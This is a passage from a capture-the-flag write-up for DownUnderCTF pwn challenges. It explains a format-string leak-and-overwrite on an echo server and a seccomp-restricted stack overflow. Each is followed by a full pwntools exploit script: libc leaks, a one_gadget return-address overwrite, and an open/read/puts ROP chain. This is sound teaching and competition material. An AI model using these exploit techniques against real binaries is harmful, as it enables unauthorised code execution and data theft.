            io <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_LIBRARY_PATH"</span> <span class="token punctuation">:</span> libs_path<span class="token punctuation">}</span> <span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>server_ip<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h2 id="3-echos"><a href="#3-echos" class="headerlink" title="3 [echos]"></a>3 [echos]</h2><p>This program is a echo server, to print what you input. It’s easy to find a vulnerability in this program.It is format vul. we need use this vulnerability to leak main function return address in stack and leak libc base address.  Use libc database to search libc version by countent of leak then to download it. a one_gadget tool is very useful tool for searching one gadget in libc.  In order to get shell we should modify main ret address in stack as one gadget</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># author: i0gan</span>
<span class="token comment" spellcheck="true"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> os

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>


<span class="token comment" spellcheck="true">#context.log_level='debug'</span>

elf_path  <span class="token operator">=</span> <span class="token string">'./echos.bk'</span>
MODIFY_LD <span class="token operator">=</span> <span class="token number">0</span>
arch <span class="token operator">=</span> <span class="token string">'64'</span>
libc_v <span class="token operator">=</span> <span class="token string">'2.27'</span>

ld_path   <span class="token operator">=</span> <span class="token string">'/glibc/'</span> <span class="token operator">+</span> libc_v <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> arch <span class="token operator">+</span> <span class="token string">'/lib/ld-linux-x86-64.so.2'</span>
libs_path <span class="token operator">=</span> <span class="token string">'/glibc/'</span> <span class="token operator">+</span> libc_v <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> arch <span class="token operator">+</span> <span class="token string">'/lib'</span>
libc_path <span class="token operator">=</span> <span class="token string">'/glibc/'</span> <span class="token operator">+</span> libc_v <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> arch <span class="token operator">+</span> <span class="token string">'/lib/libc.so.6'</span>
libc_path <span class="token operator">=</span> <span class="token string">'./libc.so.6'</span>

<span class="token comment" spellcheck="true"># change ld path </span>
<span class="token keyword">if</span><span class="token punctuation">(</span>MODIFY_LD<span class="token punctuation">)</span><span class="token punctuation">:</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cp '</span> <span class="token operator">+</span> elf_path <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> elf_path <span class="token operator">+</span> <span class="token string">'.bk'</span><span class="token punctuation">)</span>
    change_ld_cmd <span class="token operator">=</span> <span class="token string">'patchelf  --set-interpreter '</span> <span class="token operator">+</span> ld_path <span class="token operator">+</span><span class="token string">' '</span> <span class="token operator">+</span> elf_path
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>change_ld_cmd<span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'modify ld ok!'</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># remote server ip and port</span>
server_ip <span class="token operator">=</span> <span class="token string">"chal.duc.tf"</span>
server_port <span class="token operator">=</span> <span class="token number">30001</span>

<span class="token comment" spellcheck="true"># if local debug</span>
LOCAL <span class="token operator">=</span> <span class="token number">0</span>
LIBC  <span class="token operator">=</span> <span class="token number">0</span>


<span class="token comment" spellcheck="true">#--------------------------func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>LOCAL<span class="token punctuation">)</span><span class="token punctuation">:</span>
        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#--------------------------exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    li<span class="token punctuation">(</span><span class="token string">'exploit...'</span><span class="token punctuation">)</span>
    offset <span class="token operator">=</span> <span class="token number">8</span>
    p <span class="token operator">=</span> <span class="token string">'%11$p,%27$p,%19$p'</span>

    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
    leak <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    elf_base <span class="token operator">=</span> leak <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x563d9cb8e8dd</span> <span class="token operator">-</span> <span class="token number">0x563d9cb8e000</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'elf_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>elf_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># leak stack base</span>
    ru<span class="token punctuation">(</span><span class="token string">',0x'</span><span class="token punctuation">)</span>
    leak <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'stack_leak: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>
    main_ret <span class="token operator">=</span> leak <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7ffc1f9e87e0</span> <span class="token operator">-</span> <span class="token number">0x7ffc1f9e8708</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'main_ret: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>main_ret<span class="token punctuation">)</span><span class="token punctuation">)</span>

    ru<span class="token punctuation">(</span><span class="token string">',0x'</span><span class="token punctuation">)</span>
    leak <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'main_init_leak: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>leak <span class="token operator">-</span> <span class="token number">231</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    db<span class="token punctuation">(</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> leak <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7f7d13204b97</span> <span class="token operator">-</span> <span class="token number">0x7f7d131e3000</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4f322</span>


    p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token punctuation">(</span>one_gadget <span class="token operator">&amp;</span> <span class="token number">0xFF0000</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$hhn'</span>
    p <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_ret <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0xF0000</span>
    li<span class="token punctuation">(</span><span class="token string">'one_gadget: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#db()</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>

    ru<span class="token punctuation">(</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>one_gadget <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$hn'</span>
    p <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">3</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_ret <span class="token operator">+</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0xF0000</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>
            io <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_LIBRARY_PATH"</span> <span class="token punctuation">:</span> libs_path<span class="token punctuation">,</span> <span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libc_path<span class="token punctuation">}</span> <span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_LIBRARY_PATH"</span> <span class="token punctuation">:</span> libs_path<span class="token punctuation">}</span> <span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>server_ip<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h2 id="4-return-to-whats-revenge"><a href="#4-return-to-whats-revenge" class="headerlink" title="4 [return-to-whats-revenge]"></a>4 [return-to-whats-revenge]</h2><p>Same as before, there is a stack overflow  vulnerability in this program. but this program has a protection in sandbox function.  It is a seccomp rule to forbid some syscall. The sandbox function content as follows:</p>
<pre><code>  filter[24].code = 6;
  filter[24].jt = 0;
  filter[24].jf = 0;
  filter[0x18].k = 0;
  bpf_resolve_jumps(&amp;lab, filter, 0x19uLL);
  prog.len = 0x19;
  prog.filter = filter;
  prctl(0x26, 1LL, 0LL, 0LL, 0LL, *(_QWORD *)&amp;prog.len, filter);// PR_SET_NO_NEW_PRIVS, no execve
  prctl(0x16, 2LL, &amp;prog);</code></pre>
<p>but this program I can’t use seccomp tool to dump the rule. so it has a bad syscall  when I use orw method to exploit this program, this rule cannot use open function to open file, must use syscall with specific value in regisger to realize open function, or it will call open syscall failed! That’s a place easily to make a mistake. </p>
<p>​    you must create a open function syscall by yourself, or while calling open function in libc will be a bad syscall.</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># author: i0gan</span>
<span class="token comment" spellcheck="true"># env: pwndocker [skysider/pwndocker (v: 2020/09/09)]</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> os

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>


context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>

elf_path  <span class="token operator">=</span> <span class="token string">'./return-to-whats-revenge.bk'</span>

MODIFY_LD <span class="token operator">=</span> <span class="token number">0</span>
arch <span class="token operator">=</span> <span class="token string">'64'</span>
libc_v <span class="token operator">=</span> <span class="token string">'2.23'</span>

ld_path   <span class="token operator">=</span> <span class="token string">'/glibc/'</span> <span class="token operator">+</span> libc_v <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> arch <span class="token operator">+</span> <span class="token string">'/lib/ld-linux-x86-64.so.2'</span>
libs_path <span class="token operator">=</span> <span class="token string">'/glibc/'</span> <span class="token operator">+</span> libc_v <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> arch <span class="token operator">+</span> <span class="token string">'/lib'</span>
libc_path <span class="token operator">=</span> <span class="token string">'/glibc/'</span> <span class="token operator">+</span> libc_v <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> arch <span class="token operator">+</span> <span class="token string">'/lib/libc.so.6'</span>
libc_path <span class="token operator">=</span> <span class="token string">'./libc.so.6'</span>
<span class="token comment" spellcheck="true">#libc_path = '/lib/x86_64-linux-gnu/libc.so.6'</span>

<span class="token comment" spellcheck="true"># change ld path </span>
<span class="token keyword">if</span><span class="token punctuation">(</span>MODIFY_LD<span class="token punctuation">)</span><span class="token punctuation">:</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cp '</span> <span class="token operator">+</span> elf_path <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> elf_path <span class="token operator">+</span> <span class="token string">'.bk'</span><span class="token punctuation">)</span>
    change_ld_cmd <span class="token operator">=</span> <span class="token string">'patchelf  --set-interpreter '</span> <span class="token operator">+</span> ld_path <span class="token operator">+</span><span class="token string">' '</span> <span class="token operator">+</span> elf_path
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>change_ld_cmd<span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'modify ld ok!'</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># remote server ip and port</span>
server_ip <span class="token operator">=</span> <span class="token string">"chal.duc.tf"</span>
server_port <span class="token operator">=</span> <span class="token number">30006</span>

<span class="token comment" spellcheck="true"># if local debug</span>
LOCAL <span class="token operator">=</span> <span class="token number">1</span>
LIBC  <span class="token operator">=</span> <span class="token number">1</span>


<span class="token comment" spellcheck="true">#--------------------------func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>LOCAL<span class="token punctuation">)</span><span class="token punctuation">:</span>
        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>


<span class="token comment" spellcheck="true">#--------------------------exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    li<span class="token punctuation">(</span><span class="token string">'exploit...'</span><span class="token punctuation">)</span>
    pop_rdi <span class="token operator">=</span> <span class="token number">0x04019db</span>
    ret <span class="token operator">=</span> <span class="token number">0x0401016</span>
    bss <span class="token operator">=</span> <span class="token number">0x404000</span> <span class="token operator">+</span> <span class="token number">0x100</span>
    p <span class="token operator">=</span> b<span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x30</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4011DA</span><span class="token punctuation">)</span>

    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> b<span class="token string">'\x7f\x00\x00'</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'leak: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> leak <span class="token operator">-</span> <span class="token number">0x0809c0</span>
    li<span class="token punctuation">(</span><span class="token string">'lib_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    pop_rdx <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1b96</span>
    pop_rsi <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x23e6a</span>
    pop_rax <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x439c8</span>
    libc_read <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x110070</span>
    libc_open <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x10fc40</span>
    syscall <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x11007f</span>

    p <span class="token operator">=</span> b<span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x30</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># read</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_read<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># open</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># read</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_read<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># puts</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#db()</span>

    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#p = b'/chal/flag.txt\x00'</span>
    p <span class="token operator">=</span> b<span class="token string">'flag.txt\x00'</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>
            io <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_LIBRARY_PATH"</span> <span class="token punctuation">:</span> libs_path<span class="token punctuation">,</span> <span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libc_path<span class="token punctuation">}</span> <span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_LIBRARY_PATH"</span> <span class="token punctuation">:</span> libs_path<span class="token punctuation">}</span> <span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elf_path<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>server_ip<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h2 id="5-is-this-pwn-or-web"><a href="#5-is-this-pwn-or-web" class="headerlink" title="5 [is-this-pwn-or-web]"></a>5 [is-this-pwn-or-web]</h2><p>This puzzle is not a python sandbox escape, it is a javascript memory overflow.</p>
